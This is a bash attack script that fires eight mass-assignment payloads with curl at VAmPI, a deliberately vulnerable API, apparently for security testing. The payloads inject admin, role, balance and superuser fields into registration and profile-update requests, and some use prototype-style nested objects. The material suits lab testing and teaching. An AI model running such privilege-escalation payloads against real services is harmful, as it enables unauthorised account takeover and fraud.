#!/bin/bash
# Mass Assignment attack payloads
# Tools: curl, jq
# Targets: VAmPI user registration and profile update endpoints
# Estimated duration: 1 minute
set -uo pipefail

TARGET="${1:?Usage: 06-mass-assignment.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}/vampi"

echo "[*] Mass Assignment attack suite against VAmPI at ${TARGET}"
echo ""

# --- Helper ---
mass_test() {
  local label="$1"
  shift
  resp=$(curl -sk -w "\n%{http_code}" "$@" --max-time 10) || resp="ERR"
  code=$(echo "$resp" | tail -1)
  body=$(echo "$resp" | sed '$d')
  echo "    ${label} -> HTTP ${code}"
  echo "      Body: ${body:0:120}"
}

# --- 1. Register with admin escalation fields ---
echo "[+] Payload 1: Register with admin=true"
mass_test "register admin=true" \
  -X POST "${BASE}/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"masstest1","password":"Test1234","email":"mass1@example.com","admin":true}'

echo ""

# --- 2. Register with role=admin ---
echo "[+] Payload 2: Register with role=admin"
mass_test "register role=admin" \
  -X POST "${BASE}/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"masstest2","password":"Test1234","email":"mass2@example.com","role":"admin"}'

echo ""

# --- 3. Register with balance manipulation ---
echo "[+] Payload 3: Register with balance=99999"
mass_test "register balance=99999" \
  -X POST "${BASE}/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"masstest3","password":"Test1234","email":"mass3@example.com","balance":99999}'

echo ""

# --- 4. Register with multiple privilege fields ---
echo "[+] Payload 4: Register with multiple escalation fields"
mass_test "register multi-field escalation" \
  -X POST "${BASE}/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"masstest4","password":"Test1234","email":"mass4@example.com","admin":true,"role":"superadmin","is_staff":true,"is_superuser":true,"balance":99999}'

echo ""

# --- Get token for authenticated tests ---
echo "[+] Authenticating for PUT/PATCH tests..."
# Use the declared origin-issued token across independent VAmPI replicas.
TOKEN=$(python3 "$(dirname "$0")/../../scripts/fixture_token.py" vampi_token) || exit 1
if [[ -z "$TOKEN" ]]; then
  echo "[FAIL] Native authentication prerequisite failed" >&2
  exit 1
fi

echo ""

# --- 5. PUT with admin escalation ---
echo "[+] Payload 5: PUT user with admin=true"
mass_test "PUT /users/v1/massput admin=true" \
  -X PUT "${BASE}/users/v1/massput" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"admin":true,"role":"admin"}'

echo ""

# --- 6. PUT with nested object injection ---
echo "[+] Payload 6: PUT with nested object injection"
mass_test "PUT nested __class__ injection" \
  -X PUT "${BASE}/users/v1/massput" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"username":"massput","__class__":{"admin":true},"constructor":{"prototype":{"admin":true}}}'

echo ""

# --- 7. PATCH with array field manipulation ---
echo "[+] Payload 7: PATCH with array manipulation"
mass_test "PATCH roles array" \
  -X PATCH "${BASE}/users/v1/massput" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"roles":["admin","superadmin"],"permissions":["read","write","delete","admin"]}'

echo ""

# --- 8. PUT email change + privilege escalation combo ---
echo "[+] Payload 8: PUT email change with privilege escalation"
mass_test "PUT email+admin combo" \
  -X PUT "${BASE}/users/v1/massput/email" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"email":"admin@example.com","admin":true,"verified":true}'

echo ""
echo "[*] Mass Assignment attack suite complete (8 payloads sent)"
